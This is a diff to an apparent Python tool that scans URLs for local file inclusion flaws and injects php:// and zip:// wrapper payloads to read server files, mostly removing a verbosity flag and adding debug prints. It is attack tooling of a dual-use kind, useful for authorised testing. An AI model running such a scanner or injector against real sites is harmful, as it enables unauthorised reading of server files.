@@ -25,18 +25,20 @@ def scan(url):
     vuln = []
     
     for link in maybeVuln:
-        if test(link, 0):
+        if test(link):
             vuln.append(link)
-    for i in vuln:
-        i = strip(i)
     for link in set(vuln):
-        print(link, "might be vulnerable for LFI")
+        print(strip(link), "might be vulnerable for LFI")
+      
+      
         
 def injectable(url):
     regex = re.compile('\?[a-zA-Z0-9]{1,}=')
     if regex.search(url):
         return True
     return False
+
+
 
 def strip(url):
     if injectable(url):
@@ -47,29 +49,32 @@ def strip(url):
         print("Error, url entered is not correct.")
         return ""
 
-def test(url, v=1):
+
+
+def test(url):
     vuln = False
     if injectable(url):
         for test in payloads:
             payload = craftPayload(strip(url), payloads[test])
-            test = injectionTest(payload, v)
-            if test and v == 1:
+            test = injectionTest(payload)
+            if test:
                 vuln = True
                 print("Payload:", payload)
-            elif test and v == 0:
-                vuln = True
-    else:
-        if v == 1:
-            print("The url may not be injectable")
+    else:    
+        print("The url may not be injectable")
     return vuln
+
+
 
 def craftPayload(url, *argv):
     if len(argv) == 1:
         return url + argv[0]
     else:
         return url + payloads[argv[0]] + argv[1] 
+
+
         
-def injectionTest(payload, v=1):
+def injectionTest(payload):
     if re.search('zip://', payload):
         pass
     elif re.search('php://input', payload):
@@ -85,7 +90,7 @@ def injectionTest(payload, v=1):
                     vuln = True
             if doubleCheck(r.text, payload):
                 vuln = True
-            if vuln and v == 1:
+            if vuln:
                 print("Website might be vulnerable.")
                 print("Try injecting with --inject [url] [ressource]\n")
             return vuln
@@ -93,11 +98,12 @@ def injectionTest(payload, v=1):
             print("Website might be vulnerable: returned", r.status_code, "\n")
             return True
         elif r.status_code == 301 or r.status_code == 302:
-            if v == 1:
-                print("Website might be vulnerable: returned", r.status_code, "\n")
+            print("Website might be vulnerable: returned", r.status_code, "\n")
             return True
         else:
             return False
+
+
 
 def doubleCheck(text, payload):
     r = requests.get(payload + '../')
@@ -124,7 +130,7 @@ def exploit(payload):
                     except:
                         pass
             elif re.search('base64-decode', payload):
-                for i in re.findall('[a-zA-Z0-9+/]+={,2}', r.text):
+                for i in re.findall('[a-zA-Z0-9+/]+', r.text):
                     try:
                         print(base64.b64encode(i).decode())
                     except:
@@ -132,12 +138,17 @@ def exploit(payload):
             
         elif r.status_code == 404:
             print("Code: 404 Page Not Found")
+
+
                  
 def inject(url, *argv):
+    print(argv)
     if len(argv) == 2 and argv[0] in payloads:
         url = strip(url)
         payload = craftPayload(url, argv[0], argv[1])
         exploit(payload)
+
+
 
 def main():
     try:
@@ -171,13 +182,13 @@ def main():
         elif o in ("-t", "--test"):
             testSet = True
         elif o in ("-i", "--inject"):
-            injecSet = True
+            injectSet = True
             injectdict["type"] = a
-        elif o in ("-r", "--resource") and injecSet:
+        elif o in ("-r", "--resource") and injectSet:
             injectdict["resource"] = a
         else:
             assert False, "unhandled option"
-    
+            
     if usageSet:
         usage() 
     elif type(url) is str:
@@ -186,6 +197,7 @@ def main():
         elif testSet:
             test(url)
         elif injectSet:
+            print("Checkpoint 1")
             valid = True
             for key in injectdict:
                 if injectdict[key] == None:
@@ -201,6 +213,8 @@ def main():
     else:
         print("Error. You have to enter a url.")
         usage()
+
+
 
 if __name__ == '__main__':
     main()
